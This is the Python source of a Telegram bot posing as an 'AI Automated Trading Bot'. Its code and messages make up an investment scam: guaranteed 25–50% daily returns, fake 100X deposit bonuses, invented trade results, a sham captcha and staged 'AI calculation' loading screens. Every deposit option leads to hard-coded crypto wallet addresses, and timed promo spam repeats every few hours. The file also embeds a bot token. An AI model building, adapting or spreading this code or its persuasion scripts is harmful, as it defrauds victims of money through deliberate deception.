from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio
import logging
import random

logging.basicConfig(level=logging.INFO)

TOKEN = "8919833189:AAF7FG6d8FmDRJ6CpRNzPk1bTlwC8zedhhQ"

bot = Bot(token=TOKEN)
dp = Dispatcher()

WELCOME_VIDEO = "https://files.catbox.moe/4b0psz.mp4"

PLANS = {
    "plan_normal": {"name": "Normal Plan", "percent": 25, "text": "💰 <b>Normal Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 25%\n• Compounding: Not Included\n• Example Period: 30 days / 1 month projection only\n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $100 minimum.\n\nPlease enter your desired deposit amount:"},
    "plan_premium": {"name": "Premium Plan", "percent": 35, "text": "💰 <b>Premium Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 35%\n• Compounding: Not Included\n• Example Period: 30 days / 1 month projection only\n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $500 to start enjoying Premium benefits.\n\nPlease enter your desired deposit amount:"},
    "plan_diamond": {"name": "Diamond Plan", "percent": 50, "text": "💎 <b>Diamond Plan Activated</b>\n\n📊 Plan Highlights:\n• Daily Returns: 50%\n• Compounding: Available\n• Example Period: 30 days / 1 month projection only\n• Bot Access: Ongoing\n\n💵 Activation Requirement: Deposit $2000 to start enjoying Diamond benefits.\n\nPlease enter your desired deposit amount:"},
}

user_state = {}
video_shown = set()

# ==================== PROMO PORUKE ====================
# Prve 2 poruke - šalju se SAMO JEDNOM posle captcha
PROMO_ONE_TIME = [
    {
        "photo": "https://files.catbox.moe/qzkf0q.jpg",
        "caption": """💥 TRADE UPDATE — +1,551.00% ROI SECURED ON NIGHTUSDT 💥

Our automated AI system just closed an explosive 100X long on NIGHTUSDT, catching the entire move with perfect precision and zero emotions.

📊 Trade Summary
• Pair: NIGHTUSDT
• Position: Long
• Leverage: 100X
• Return: +1,551.00% ROI ✅

💰 Potential Profit Examples:
• Deposit $500 → $8,255 profit
• Deposit $1,000 → $16,510 profit

✅ Instant withdrawals — profits always available
✅ Thousands of users earn daily from these automated trades

⚡️ The next high-ROI setup is already loading…
Every minute you wait is another missed 1,000%+ move.

👉 Make your deposit now and let the bot catch the next trade automatically.""",
        "delay_minutes": 17
    },
    {
        "photo": "https://files.catbox.moe/ppftvb.jpg",
        "caption": """🎉 CONGRATULATIONS — YOU’VE BEEN RANDOMLY SELECTED OUT OF 230,000 USERS 🎉

Your account has just been awarded a limited 100X DEPOSIT BONUS, active for the next 2 HOURS ONLY.

This offer is NOT available to the public — only 0.01% of users received it today.

🔥 Deposit ANY amount from $200+ and instantly receive a full 100X bonus.
No maximum. Deposit as much as you want and multiply it by 100X.

💰 Examples (100X Bonus Active):
• Deposit $200 → Get $20,000 bonus
• Deposit $500 → Get $50,000 bonus
• Deposit $1,000 → Get $100,000 bonus
• Deposit $5,000 → Get $500,000 bonus

⚡️ All bonus funds are withdrawable instantly — no fees, no restrictions.

⏳ Your window is extremely limited.
You were chosen by pure luck — once the 2-hour timer ends, this reward expires permanently.

This is a once-in-a-lifetime opportunity…
Most users will NEVER see this bonus.

🚀 PRESS DEPOSIT NOW 
Claim your 100X bonus before your spot is given to someone else.""",
        "delay_minutes": 117
    }
]

# Ostale poruke - ponavljaju se (4-5 sati između poruka)
PROMO_REPEATING = [
    {
        "photo": "https://files.catbox.moe/8pcfqm.jpg",
        "caption": """🚨 LIMITED SPOTS – INSANE 10X MULTIPLIER OFFER JUST DROPPED! 🚨

💸 Turn Your Deposit into a Fortune — Starting from JUST $100! This is your chance to multiply your balance like never before, but you MUST act NOW. Time is running out!

Here’s what’s waiting for you:
🔥 Deposit $100 ➡️ Get $1,000 (10X)
🔥 Deposit $200 ➡️ Get $3,000 (15X)
🔥 Deposit $500 ➡️ Get $10,000 (20X)
🔥 Deposit $1000 ➡️ Get $50,000 (50X)

🧠 You've already joined the bot — now it's time to take the next step and unlock REAL GAINS!

Why You Can’t Miss This:
✅ Expires in 1 hour — Don’t wait, or it’s gone!
✅ The ones who act NOW will WIN. The rest will watch.

⚡️ $100 is all it takes to start your journey. Don't let this once-in-a-lifetime opportunity slip through your fingers!

PRESS “DEPOSIT” NOW to claim your multiplier and level up your balance before it's too late!"""
    },
    {
        "photo": "https://files.catbox.moe/lc1z8s.jpg",
        "caption": """💥 TRADE UPDATE — +1,099.00% ROI SECURED ON ROLLUSDT 💥

Our automated AI system just closed an explosive 100X long on ROLLUSDT, catching the entire move with perfect precision and zero emotions.

📊 Trade Summary
• Pair: ROLLUSDT
• Position: Long
• Leverage: 100X
• Return: +1,099.00% ROI ✅

💰 Potential Profit Examples:
• Deposit $500 → $5,995 profit
• Deposit $1,000 → $11,990 profit

✅ Instant withdrawals — profits always available
✅ Thousands of users earn daily from these automated trades

⚡ The next high-ROI setup is already loading…
Every minute you wait is another missed 1,000%+ move.

👉 Make your deposit now and let the bot catch the next trade automatically.

💬 Press below to contact support if you have any questions."""
    },
    {
        "photo": "https://files.catbox.moe/pgwql9.jpg",
        "caption": """🔍 How It Works — Pure Passive Income

Our AI trading bot earns you up to 25% daily — fully automated. No charts. No effort. Just profits.

🧠 Smart AI, Real Results
Trained on 4+ years of crypto data, our bot detects patterns, tracks global news, and reacts instantly — just like a pro trader.

📊 Trades That Follow the Money
It scans 100+ top coins and Solana tokens, locking into where momentum builds.
All trades run on secure DEXs with built-in risk controls — keeping your capital safe.

⚙️ You Do Nothing. It Earns Everything.
START WITH JUST $200 — EARN $100 DAILY.
Withdraw anytime, straight to your crypto wallet. Instant, private, and safe.

🔎 Transparent From Day One
After deposit, you’ll see real-time performance: trades, accuracy, and profit.

🚀 Ready to Earn While You Sleep?
Your crypto, our AI. Let’s grow it daily.
Deposit now — and start earning today."""
    },
    {
        "photo": "https://files.catbox.moe/d5of20.jpg",
        "caption": """💥 TRADE UPDATE — +6,267% ROI SECURED ON SPCUSDT 💥

Our automated AI system just closed an explosive 100X long on SPCUSDT, catching the entire move with perfect precision and zero emotions.

📊 Trade Summary
• Pair: SPCUSDT
• Position: Long
• Leverage: 100X
• Return: +6,267% ROI ✅

💰 Potential Profit Examples:
• Deposit $500 → $31,835 profit
• Deposit $1,000 → $63,670 profit

✅ Instant withdrawals — profits always available
✅ Thousands of users earn daily from these automated trades

⚡ The next high-ROI setup is already loading…
Every minute you wait is another missed 1,000%+ move.

👉 Make your deposit now and let the bot catch the next trade automatically."""
    },
    {
        "photo": "https://files.catbox.moe/x9mrcr.jpg",
        "caption": """🌟 Good Morning, Users! 🌟

📈 Yesterday was phenomenal! Our bot achieved incredible success, generating an impressive +150,000% ($155,000,000) in returns! 🚀

🎉 Exciting Update: The bot delivered an outstanding 150,000% return to users yesterday, surpassing expectations and significantly growing investments. One user even earned a remarkable $2,000,000 in just one day! Stay tuned—some amazing bonuses are on the way today!

💼 Your Opportunity Awaits: Start with as little as $100, and enjoy consistent daily returns of 25%—guaranteed. This is your chance to take control and transform your financial future!

📩 Need Help? Our friendly support team is available 24/7 to answer any questions or assist with anything you need. 

📢 Join Our Community & See the Results for Yourself! Check out real user reviews and live trade updates.

💡 Make today the day you invest in your future and unlock steady growth. Start now!"""
    },
    # ==================== NOVE PORUKE KOJE SI POSLAO ====================
    {
        "photo": "https://files.catbox.moe/tt5yqt.jpg",
        "caption": """💥 TRADE UPDATE — +5,000.00% ROI SECURED ON FOG USDT 💥

Our automated AI system just closed an explosive 100X long on FOG USDT, catching the entire move with perfect precision and zero emotions.

📊 Trade Summary
• Pair: FOG USDT
• Position: Long
• Leverage: 100X
• Return: +5,000.00% ROI ✅

💰 Potential Profit Examples:
• Deposit $500 → $25,500 profit
• Deposit $1,000 → $51,000 profit

✅ Instant withdrawals — profits always available
✅ Thousands of users earn daily from these automated trades

⚡️ The next high-ROI setup is already loading…
Every minute you wait is another missed 1,000%+ move.

👉 Make your deposit now and let the bot catch the next trade automatically."""
    },
    {
        "photo": "https://files.catbox.moe/xe9lr4.jpg",
        "caption": """THE BOT JUST CLOSED A LIFE-CHANGING TRADE 💥

😳 +9,755.00%😳

Our users made over $98,550 in minutes — and they started with just $1000.

Yes, fully automated. No effort. No stress. Just profits.

While you’re still thinking, others are out here printing generational wealth — on autopilot.

The bot trades for you, generating 25% daily returns, scaling up to +1,000% and beyond.

You’re literally one step away.
Press DEPOSIT now to activate your bot and start earning real money automatically.

Stop watching. Start winning.
Time is money — don’t waste either."""
    },
    {
        "photo": "https://files.catbox.moe/zxkh9b.jpg",
        "caption": """💥 TRADE UPDATE — +2,103.00% ROI SECURED ON DEGEN USDT 💥

Our automated AI system just closed an explosive 100X long on DEGEN USDT, catching the entire move with perfect precision and zero emotions.

📊 Trade Summary
• Pair: DEGEN USDT
• Position: Long
• Leverage: 100X
• Return: +2,103.00% ROI ✅

💰 Potential Profit Examples:
• Deposit $500 → $11,015 profit
• Deposit $1,000 → $22,030 profit

✅ Instant withdrawals — profits always available
✅ Thousands of users earn daily from these automated trades

⚡ The next high-ROI setup is already loading…
Every minute you wait is another missed 1,000%+ move.

👉 Make your deposit now and let the bot catch the next trade automatically.

💬 Press here to contact support (http://t.me/aiautomatedsupport) if you have any questions."""
    }
]

# === SLANJE PROMO PORUKA ===
async def send_promo_after_start(user_id):
    # Prve 2 poruke - šalju se samo jednom
    for promo in PROMO_ONE_TIME:
        await asyncio.sleep(promo["delay_minutes"] * 60)
        try:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Live Support", url="https://t.me/aitradesupport")],
                [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")]
            ])
            await bot.send_photo(
                chat_id=user_id,
                photo=promo["photo"],
                caption=promo["caption"] + "\n\n💬 Press below to contact support if you have any questions.",
                reply_markup=kb,
                parse_mode="HTML"
            )
        except:
            pass

    # Ponavljajuće poruke (3-4 sati između poruka)
    while True:
        await asyncio.sleep(random.randint(3*3600, 4*3600))  # 3-4 sati

        try:
            promo = random.choice(PROMO_REPEATING)
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Live Support", url="https://t.me/aitradesupport")],
                [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit")]
            ])
            await bot.send_photo(
                chat_id=user_id,
                photo=promo["photo"],
                caption=promo["caption"] + "\n\n💬 Press below to contact support if you have any questions.",
                reply_markup=kb,
                parse_mode="HTML"
            )
        except:
            pass

# CAPTCHA - samo dugme
async def send_captcha(chat_id, user_id):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Click here to prove you're human", callback_data="captcha_pass")]
    ])

    await bot.send_message(
        chat_id=chat_id,
        text="🛡️ <b>Prove you're human</b>\n\nPlease click the button below to continue.",
        reply_markup=kb,
        parse_mode="HTML"
    )

# Glavni meni (i ostatak koda ostaje potpuno isti)
async def send_main_menu(chat_id, first_time=False):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Deposit", callback_data="deposit")],
        [InlineKeyboardButton(text="💰 Profit Calculator", callback_data="calculator")],
        [InlineKeyboardButton(text="📖 How It Works", callback_data="howitworks")],
        [InlineKeyboardButton(text="✅ User Reviews", callback_data="reviews")],
        [InlineKeyboardButton(text="👤 My Account & Balance", callback_data="account")],
        [InlineKeyboardButton(text="📞 Live Support", callback_data="livesupport")]
    ])
    
    welcome_text = (
        "🚀 Welcome to AI Automated Trading Bot™\n"
        "Powered by AI TRADING GROUP LTD (UK Company No. 15779119)\n\n"
        "The Future of Fully Automated Crypto Trading Is Here.\n\n"
        "Our advanced AI-powered trading system has been developed over several years to analyze global crypto markets in real time, identify high-probability opportunities, and execute trades automatically — 24/7.\n\n"
        "💰 Start With Just $100\n"
        "Get instant access to our fully automated AI trading system and earn a GUARANTEED 25% daily income through our fully automated AI trading system.\n\n"
        "No trading experience needed.\nNo manual work.\nThe AI handles everything for you.\n\n"
        "🤖 How The Bot Works\n"
        "Our artificial intelligence continuously scans:\n"
        "• Live crypto market movements\n"
        "• Breaking financial news & market sentiment\n"
        "• High-volume trading opportunities\n"
        "• Real-time volatility across decentralized exchanges\n\n"
        "Once profitable setups are detected, the bot automatically enters and exits trades within seconds to maximize profit potential while reducing risk exposure.\n\n"
        "📈 Why Thousands Trust Our System\n"
        "✅ Registered UK Company — AI TRADING GROUP LTD\n"
        "✅ 100,000+ active users worldwide\n"
        "✅ Millions processed in withdrawals\n"
        "✅ 96.4% AI trade accuracy\n"
        "✅ Up to 25% daily income potential\n"
        "✅ Instant withdrawals available\n"
        "✅ Full transparency & live profit tracking\n"
        "✅ 24/7 automated trading operations\n\n"
        "🔒 Your Funds Stay Protected\n"
        "We prioritize transparency, security, and user control.\n\n"
        "There are:\n"
        "• No hidden fees\n"
        "• No locked balances\n"
        "• No complicated trading knowledge required\n\n"
        "You can monitor your profits, track trades, and request withdrawals directly from your dashboard at any time.\n\n"
        "💼 Let The AI Work While You Relax\n"
        "While most people spend hours studying charts and trying to predict the market, our AI does the hard work automatically — faster, smarter, and more efficiently.\n\n"
        "📢 Verified User Reviews Available\n"
        "See real withdrawal proofs and feedback from members already using the platform successfully.\n\n"
        "⚠️ LIMITED ACCESS AVAILABLE\n"
        "Due to increasing demand, new user spots may become limited during peak trading periods.\n\n"
        "👉 Press “💰 Deposit” below to activate your trading account and start earning with AI-powered automation today."
    )

    if first_time:
        await bot.send_video(chat_id=chat_id, video=WELCOME_VIDEO, supports_streaming=True)
    
    await bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=kb, parse_mode="HTML")

@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    await send_captcha(message.chat.id, user_id)

# ==================== NOVE KOMANDE (ostaju iste) ====================
@dp.message(Command("deposit"))
async def cmd_deposit(message: types.Message):
    await send_deposit_section(message.chat.id)

@dp.message(Command("calculator"))
async def cmd_calculator(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Normal Plan", callback_data="plan_normal")],
        [InlineKeyboardButton(text="🥇 Premium Plan", callback_data="plan_premium")],
        [InlineKeyboardButton(text="💎 Diamond Plan", callback_data="plan_diamond")],
        [InlineKeyboardButton(text="← Back", callback_data="back_main")]
    ])
    await message.answer("💰 <b>Profit Calculator</b>\n\nSelect your trading plan:", reply_markup=kb, parse_mode="HTML")

@dp.message(Command("howitworks"))
async def cmd_howitworks(message: types.Message):
    text = (
        "🚀 <b>Discover the Power of Automation</b>\n\n"
        "Our state-of-the-art AI trading system handles all cryptocurrencies, big and small, to deliver a remarkable 25% daily income. Fully automated and stress-free, it's designed to grow your wealth effortlessly.\n\n"
        "🌟 <b>Enjoy Complete Freedom</b>\n"
        "• No Withdrawal Fees: Withdraw any amount, anytime, without any hidden fees.\n"
        "• Free to Use: Access all features without additional costs.\n\n"
        "📖 <b>Step-by-Step Activation Guide</b>\n\n"
        "1️⃣ Press 💰 Deposit\nNavigate to the Deposit section and select your preferred cryptocurrency (e.g., USDT, BTC, ETH).\n\n"
        "2️⃣ Receive Your Unique Wallet Address\nInstantly get a personal deposit address. No extra logins or accounts required — your Telegram ID is your secure entry point.\n\n"
        "3️⃣ Send Your Funds\nTransfer your desired amount to the provided wallet address.\nMinimum deposit: $100.\nYour balance updates automatically after confirmation.\n\n"
        "4️⃣ Activate Your Bot\nOnce your deposit is detected, the bot activates instantly, scanning markets and trading on your behalf safely and automatically.\n\n"
        "5️⃣ Start Earning\nEnjoy daily profit additions to your balance.\nWithdraw anytime by selecting 💸 Withdraw Funds in the menu.\n\n"
        "🔒 <b>Security First</b>\n\nOperate entirely within Telegram, secured by your unique Telegram ID. Only you have access to your funds.\n\n"
        "⚡ <b>Get Started Now</b>\n\n"
        "Deposit, activate, earn, and withdraw — effortlessly and securely.\n\n"
        "👉 Tap 💰 Deposit to begin your journey with AI Automated Trading."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
        [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
    ])
    await message.answer(text, reply_markup=kb, parse_mode="HTML")

@dp.message(Command("reviews"))
async def cmd_reviews(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Reviews", url="https://t.me/aiautomatedtradingreviews")],
        [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
    ])
    await message.answer("📢 <b>Check our past trades and user comments by joining the Reviews group!</b>", reply_markup=kb, parse_mode="HTML")

@dp.message(Command("account"))
async def cmd_account(message: types.Message):
    text = (
        "👤 <b>Your Account Dashboard</b>\n\n"
        "📶 Plan: Not Activated\n\n"
        "💰 Balance: 0.00 USDT\n"
        "💵 Total Deposited: 0.00 USDT\n"
        "📤 Total Withdrawn: 0.00 USDT\n"
        "📈 Total Profit: 0.00 USDT\n\n"
        "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
        "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
        "🎁 <b>Limited-Time Activation Bonus</b>\n\n"
        "💵 Deposit $500+ → Get a $50,000 Bonus, available to withdraw at any time with no fees.\n\n"
        "👇 Click 💰 Deposit Now and Activate Your Account."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
        [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
    ])
    await message.answer(text, reply_markup=kb, parse_mode="HTML")

@dp.message(Command("support"))
async def cmd_support(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Contact Support", url="https://t.me/aitradesupport")]
    ])
    await message.answer("📞 <b>Premium Client Support — Available 24/7</b>\n\nClick the button below to contact support.", reply_markup=kb, parse_mode="HTML")

# === FUNKCIJA ZA DEPOSIT ===
async def send_deposit_section(chat_id):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="USDT (TRC20)", callback_data="dep_usdt")],
        [InlineKeyboardButton(text="BTC", callback_data="dep_btc")],
        [InlineKeyboardButton(text="ETH", callback_data="dep_eth")],
        [InlineKeyboardButton(text="SOL", callback_data="dep_sol")],
        [InlineKeyboardButton(text="USDC (SOL)", callback_data="dep_usdc")],
        [InlineKeyboardButton(text="TRX", callback_data="dep_trx")],
        [InlineKeyboardButton(text="← Back", callback_data="back_main")]
    ])
    await bot.send_message(chat_id, "💸 <b>Deposit Section</b>\n\nChoose cryptocurrency to deposit:", reply_markup=kb, parse_mode="HTML")

# CAPTCHA i callback ostaje isti
@dp.callback_query()
async def callback_handler(callback: types.CallbackQuery):
    data = callback.data
    user_id = callback.from_user.id

    if data == "captcha_pass":
        await callback.message.delete()
        await send_main_menu(callback.message.chat.id, first_time=True)
        video_shown.add(user_id)
        asyncio.create_task(send_promo_after_start(user_id))
        return

    if data == "back_main":
        await callback.message.delete()
        await send_main_menu(callback.message.chat.id, first_time=False)
        return

    if data == "livesupport":
        await callback.message.delete()
        text = (
            "📞 <b>Premium Client Support — Available 24/7</b>\n\n"
            "At AI Automated Trading, your trust and security come first.\n\n"
            "Our support team operates 24 hours a day, 7 days a week, ensuring every question is answered and every request is handled without delay.\n\n"
            "From deposits and withdrawals to account guidance, you'll always have a professional support specialist ready to assist you — any time, any day."
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Contact Support", url="https://t.me/aitradesupport?text=")],
            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
        ])
        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")
        return

    if data == "calculator":
        await callback.message.delete()
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💸 Normal Plan", callback_data="plan_normal")],
            [InlineKeyboardButton(text="🥇 Premium Plan", callback_data="plan_premium")],
            [InlineKeyboardButton(text="💎 Diamond Plan", callback_data="plan_diamond")],
            [InlineKeyboardButton(text="← Back", callback_data="back_main")]
        ])
        await bot.send_message(callback.message.chat.id, "💰 <b>Profit Calculator</b>\n\nSelect your trading plan:", reply_markup=kb, parse_mode="HTML")

    elif data in PLANS:
        plan = PLANS[data]
        user_state[callback.from_user.id] = plan
        await callback.message.delete()
        await bot.send_message(callback.message.chat.id, plan["text"], parse_mode="HTML")

    elif data == "howitworks":
        await callback.message.delete()
        text = (
            "🚀 <b>Discover the Power of Automation</b>\n\n"
            "Our state-of-the-art AI trading system handles all cryptocurrencies, big and small, to deliver a remarkable 25% daily income. Fully automated and stress-free, it's designed to grow your wealth effortlessly.\n\n"
            "🌟 <b>Enjoy Complete Freedom</b>\n"
            "• No Withdrawal Fees: Withdraw any amount, anytime, without any hidden fees.\n"
            "• Free to Use: Access all features without additional costs.\n\n"
            "📖 <b>Step-by-Step Activation Guide</b>\n\n"
            "1️⃣ Press 💰 Deposit\nNavigate to the Deposit section and select your preferred cryptocurrency (e.g., USDT, BTC, ETH).\n\n"
            "2️⃣ Receive Your Unique Wallet Address\nInstantly get a personal deposit address. No extra logins or accounts required — your Telegram ID is your secure entry point.\n\n"
            "3️⃣ Send Your Funds\nTransfer your desired amount to the provided wallet address.\nMinimum deposit: $100.\nYour balance updates automatically after confirmation.\n\n"
            "4️⃣ Activate Your Bot\nOnce your deposit is detected, the bot activates instantly, scanning markets and trading on your behalf safely and automatically.\n\n"
            "5️⃣ Start Earning\nEnjoy daily profit additions to your balance.\nWithdraw anytime by selecting 💸 Withdraw Funds in the menu.\n\n"
            "🔒 <b>Security First</b>\n\nOperate entirely within Telegram, secured by your unique Telegram ID. Only you have access to your funds.\n\n"
            "⚡ <b>Get Started Now</b>\n\n"
            "Deposit, activate, earn, and withdraw — effortlessly and securely.\n\n"
            "👉 Tap 💰 Deposit to begin your journey with AI Automated Trading."
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
        ])
        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")

    elif data == "reviews":
        await callback.message.delete()
        text = "📢 <b>Check our past trades and user comments by joining the Reviews group!</b>"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Reviews", url="https://t.me/aiautomatedtradingreviews")],
            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
        ])
        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")

    elif data == "account":
        await callback.message.delete()
        text = (
            "👤 <b>Your Account Dashboard</b>\n\n"
            "📶 Plan: Not Activated\n\n"
            "💰 Balance: 0.00 USDT\n"
            "💵 Total Deposited: 0.00 USDT\n"
            "📤 Total Withdrawn: 0.00 USDT\n"
            "📈 Total Profit: 0.00 USDT\n\n"
            "⚡️ Your account is fully set up and ready to go. The only thing missing is your first deposit.\n\n"
            "Every minute your account remains inactive is a missed opportunity to start earning money automatically. Once funded, the bot can begin executing trades on your behalf and generating a daily income of 25%.\n\n"
            "🎁 <b>Limited-Time Activation Bonus</b>\n\n"
            "💵 Deposit $500+ → Get a $50,000 Bonus, available to withdraw at any time with no fees.\n\n"
            "👇 Click 💰 Deposit Now and Activate Your Account."
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💰 Deposit Now", callback_data="deposit")],
            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
        ])
        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")

    elif data == "deposit":
        await callback.message.delete()
        await send_deposit_section(callback.message.chat.id)

    elif data.startswith("dep_"):
        await callback.message.delete()
        coin_key = data[4:].lower()
        coin_name = {"usdt": "USDT (TRC20)", "btc": "BTC", "eth": "ETH", "sol": "Solana (SOL)", "usdc": "USDC (SOL)", "trx": "TRX"}.get(coin_key, coin_key.upper())

        addresses = {
            "usdt": "TMaWMMVPSrNRUp6hnkr1mSQAQ6XVtn8TFL",
            "btc": "bc1qgd2lgtwy9qyxryj89vj89yeg05fzup4w2nfqak",
            "eth": "0x8a947560B90aB86965a1Ea9265C16F2353308C66",
            "sol": "4YvstE1gnpfcKK4Cmoxu1LMqZxA8sHznNcnFgc2udqf6",
            "usdc": "4YvstE1gnpfcKK4Cmoxu1LMqZxA8sHznNcnFgc2udqf6",
            "trx": "TMaWMMVPSrNRUp6hnkr1mSQAQ6XVtn8TFL"
        }

        addr = addresses.get(coin_key, "N/A")

        text = f"Please deposit {coin_name} to the following address:\n\n{addr}\n\nNote: Ensure you send only {coin_name} to this address. Sending any other asset may result in permanent loss."

        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← Back to Deposit", callback_data="deposit")]])
        await bot.send_message(callback.message.chat.id, text, reply_markup=kb, parse_mode="HTML")

@dp.message()
async def handle_amount(message: types.Message):
    user_id = message.from_user.id
    if user_id not in user_state:
        return
    try:
        amount = float(message.text)
        plan = user_state[user_id]

        loading = await message.answer("🔄 Analyzing market conditions...")
        await asyncio.sleep(1.5)
        await loading.edit_text("🤖 Running AI calculations...")
        await asyncio.sleep(1.8)
        await loading.edit_text("💼 Processing your investment...")
        await asyncio.sleep(1.5)
        await loading.edit_text("✅ Calculation complete!")

        daily = amount * (plan["percent"] / 100)
        monthly = daily * 30
        final = amount + monthly
        roi = (monthly / amount) * 100 if amount > 0 else 0

        text = f"✅ <b>Profit Calculation Complete!</b>\n\n💰 Your Investment: ${amount:,.2f}\n📌 Selected Plan: {plan['name']}\n\n📊 30-Day Projection:\n• Daily Profit: ${daily:,.2f}\n• Monthly Profit: ${monthly:,.2f}\n• Final Balance: ${final:,.2f}\n• ROI: {roi:.1f}%"

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💸 Make Deposit", callback_data="deposit")],
            [InlineKeyboardButton(text="🔄 Change Plan", callback_data="calculator")],
            [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
        ])

        await message.answer(text, reply_markup=kb, parse_mode="HTML")
        await loading.delete()
        del user_state[user_id]
    except:
        await message.answer("❌ Unesi samo broj (npr. 750)")

async def main():
    print("✅ Bot je spreman sa promo porukama!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())